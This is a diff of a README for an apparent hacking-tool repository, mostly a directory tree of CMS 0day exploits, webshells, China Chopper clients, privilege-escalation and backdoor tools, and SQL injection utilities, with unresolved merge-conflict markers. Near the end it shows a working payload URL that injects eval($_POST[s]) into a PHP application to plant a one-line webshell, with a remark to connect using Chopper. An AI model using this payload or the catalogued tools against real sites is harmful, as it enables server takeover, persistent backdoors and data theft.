@@ -8,8 +8,13 @@ https://github.com/w1109790800/Permeable
 
 
 
+<<<<<<< HEAD
+'''
+├─0day
+=======
 ```
 ├─0day & exp
+>>>>>>> cb791f7b85a262e24af59376b30e2dac9a64b635
 │  ├─08CMS
 │  ├─AKCMS
 │  ├─bbsxp
@@ -129,7 +134,7 @@ https://github.com/w1109790800/Permeable
 │  ├─科讯KesionCMS
 │  ├─逐浪CMS
 │  └─风讯foosunCMS
-├─ASP程序0day
+├─ASP 0day
 │  ├─ASPCMS
 │  ├─DvBBS（动网)）
 │  ├─foosun（风讯）
@@ -143,8 +148,7 @@ https://github.com/w1109790800/Permeable
 │  ├─[博客] Z-Blog
 │  ├─动易cms
 │  └─老Y文章管理系统
-├─html工具
-├─PHP程序0day
+├─PHP 0day
 │  ├─DeDeCms（织梦）
 │  │  ├─Dede+v5.7+feedback.php-12-10-31
 │  │  ├─DedeCms buy_action SQL利用工具
@@ -181,7 +185,7 @@ https://github.com/w1109790800/Permeable
 │  │  └─shopex_EXP及后台拿shell keio20120826整理版
 │  └─[商城] ShopEx
 │      └─Shopex 注入漏洞 0day (4.8.5)
-├─xss
+├─xss 测试
 │  └─xss完整版插件keepsenins
 │      └─xss完整版插件keepsenins
 │          ├─apps
@@ -286,7 +290,18 @@ https://github.com/w1109790800/Permeable
 │      ├─sqlmap
 │      ├─延时注入
 │      └─搜型登陆框新注入
+├─大小马
+│  ├─asp大马
+│  ├─asp小马
+│  ├─JSP
+│  ├─php大马
+│  ├─php小马
+│  ├─一句话
+│  └─菜刀
+│      ├─CCC
+│      └─Customize
 ├─技术文章
+├─技术资料
 ├─提权利器
 │  ├─32位系统用户账号密码查看器
 │  ├─Api添加用户（F4ck Team）
@@ -349,12 +364,21 @@ https://github.com/w1109790800/Permeable
 │  │  ├─SunOS 5.7
 │  │  ├─SunOS 5.8
 │  │  └─SunOS 5.9
+│  ├─LPK2.0
 │  ├─NC反弹CMD
 │  ├─PwDump7破解管理hash
 │  ├─shell.Users组建vbs提权
+│  ├─shift后门
+│  ├─T00ls Lpk Sethc v4
+│  ├─T00ls_Lpk_Sethc_v3
+│  ├─不死帐号
+│  ├─免NET提权
 │  ├─免参数版pr
 │  ├─剑眉大侠提权常用EXP
 │  ├─开3389端口（神器）
+│  ├─截取3389
+│  │  └─dat
+│  ├─提权工具
 │  ├─无NET时添加用户（大胆）
 │  ├─无NET时添加用户（拉登哥哥）
 │  ├─星外提权EXP
@@ -403,7 +427,7 @@ https://github.com/w1109790800/Permeable
 │      ├─Less-8
 │      ├─Less-9
 │      └─sql-connections
-├─渗透
+├─渗透工具
 │  ├─3款土耳其注入工具
 │  │  └─sql programlar
 │  │      ├─m4xmysql
@@ -416,6 +440,7 @@ https://github.com/w1109790800/Permeable
 │  │      └─Domain3.5
 │  ├─gason-0.9.5
 │  ├─havij
+│  ├─html 工具
 │  ├─hulk
 │  ├─LiQiDiS_2.71a33
 │  │  └─LiQiDiS_2.71a33
@@ -668,6 +693,9 @@ https://github.com/w1109790800/Permeable
 │  ├─国外超强注入工具Cfm Private SQL Injection
 │  │  └─国外超强综合注入程序Cfm Private SQL Injection Tool
 │  │      └─hackcfm_private_src
+│  ├─御剑 1.5
+│  │  ├─临时处理数据文件夹
+│  │  └─配置文件
 │  ├─文件合并工具
 │  ├─目录字典
 │  ├─老兵COOKIES欺骗工具
@@ -677,7 +705,7 @@ https://github.com/w1109790800/Permeable
 │  │  └─mssql
 │  └─雷池加密解密
 │      └─雷池加密解密
-├─漏洞
+├─漏洞汇总
 │  ├─BT5 MSF JAVA 0day CVE-2013-0422 Exploit Demo By K8team
 │  │  └─BT5 MSF JAVA 0day CVE-2013-0422 Exploit Demo By K8team
 │  ├─dede全部exp
@@ -762,8 +790,13 @@ https://github.com/w1109790800/Permeable
     ├─端口转发神器--reDuh
     │  └─reDuhServers
     ├─组策略清除工具1.1
+<<<<<<< HEAD
+    └─远程桌面连接（可复制粘贴）
+'''
+=======
     └─远程桌面连接（可复制粘贴)
 ```
+>>>>>>> cb791f7b85a262e24af59376b30e2dac9a64b635
 
 
 ### 下面是几个文件的具体内容:
@@ -831,3 +864,4 @@ index.php/module/action/param1/{${eval($_POST[s])}}
 直接执行一句话代码，用菜刀直接连接.
 
 ```
+# 一切资源请合理使用
